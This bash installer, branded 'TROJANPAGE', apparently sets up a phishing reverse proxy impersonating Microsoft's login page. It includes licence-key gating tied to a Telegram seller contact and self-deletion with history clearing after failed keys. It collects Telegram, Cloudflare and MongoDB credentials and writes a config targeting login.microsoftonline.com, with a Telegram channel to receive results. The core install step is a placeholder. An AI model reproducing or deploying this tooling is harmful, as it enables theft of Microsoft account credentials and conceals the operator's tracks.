#!/bin/bash
# 🏛️ TROJANPAGE - ANTI-BRUTEFORCE PRO EDITION
# ------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# --- 1. THE TROJANPAGE HEADER ---
show_header() {
    clear
    echo -e "${BLUE}"
    echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
    echo -e "${NC}"
    echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
    echo " ----------------------------------------------------------------------------------"
}

# --- 2. HWID & KEY LOGIC ---
HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
SECRET_SALT="MY_PRIVATE_PHRASE_2026" 
VALID_KEY=$(echo -n "${HWID}${SECRET_SALT}" | md5sum | cut -c1-10 | tr '[:lower:]' '[:upper:]')

# --- 3. THE 3-STRIKE SENTRY ---
ATTEMPTS=0
while [ $ATTEMPTS -lt 3 ]; do
    show_header
    echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
    echo -e "${BLUE}[!] Send HWID to @YourUsername on TG for activation.${NC}"
    echo " ----------------------------------------------------------------------------------"
    
    if [ $ATTEMPTS -gt 0 ]; then
        echo -e "${RED}[warning] Attempt $((ATTEMPTS)) of 3 failed. Self-destruct in $((3 - ATTEMPTS)) strikes.${NC}"
    fi

    read -p "ENTER ACTIVATION KEY: " USER_KEY

    if [ "$USER_KEY" == "$VALID_KEY" ]; then
        echo -e "${GREEN}[success] Activation Successful. Initializing...${NC}"
        sleep 2
        break
    else
        ATTEMPTS=$((ATTEMPTS + 1))
        sleep 1
    fi

    if [ $ATTEMPTS -eq 3 ]; then
        echo -e "${RED}[critical] Brute-force detected. Self-destructing...${NC}"
        sleep 1
        # DELETE SELF AND HISTORY
        rm -- "$0"
        history -c
        clear
        exit 1
    fi
done

# --- 4. VERIFIED SETUP WIZARD (Runs ONLY after Activation) ---
echo -e "\n${BLUE}--- CONFIGURATION SETUP (VERIFIED) ---${NC}"

# TELEGRAM CHECK
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    echo -ne "[...] Validating Telegram..."
    if curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe" | grep -q "\"ok\":true"; then
        echo -e "${GREEN} VALID${NC}"; break
    else
        echo -e "${RED} INVALID. Try again.${NC}"
    fi
done

# CLOUDFLARE CHECK
while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    echo -ne "[...] Validating Cloudflare..."
    if curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN" | grep -q "\"status\":\"active\""; then
        echo -e "${GREEN} VALID${NC}"; break
    else
        echo -e "${RED} INVALID. Try again.${NC}"
    fi
done

# MONGODB CHECK
sudo apt update && sudo apt install -y mongodb-clients > /dev/null 2>&1
while true; do
    read -p "Enter MongoDB User: " M_USER
    read -p "Enter MongoDB Pass: " M_PASS
    echo -ne "[...] Testing MongoDB..."
    if mongosh --host localhost --username "$M_USER" --password "$M_PASS" --authenticationDatabase admin --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1; then
        echo -e "${GREEN} CONNECTED${NC}"; break
    else
        echo -e "${RED} AUTH FAILED. Try again.${NC}"
    fi
done

read -p "Enter Domain (e.g., motarmo.click): " USER_DOMAIN

# --- 5. FINAL DEPLOYMENT ---
# Setup License (90 Days)
CURRENT_DATE=$(date +%s)
EXPIRY=$(($CURRENT_DATE + 7776000))
echo "$HWID:$EXPIRY" > /root/.license

# Create Config
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "target": "login.microsoftonline.com",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "mongodb": "mongodb://$M_USER:$M_PASS@localhost:27017"
}
EOF

# [Insert Core Installation, Adobe GUI, and run.sh creation here]

echo -e "${GREEN}[+] DEPLOYED SUCCESSFULY. Type 'start' to begin operations.${NC}"
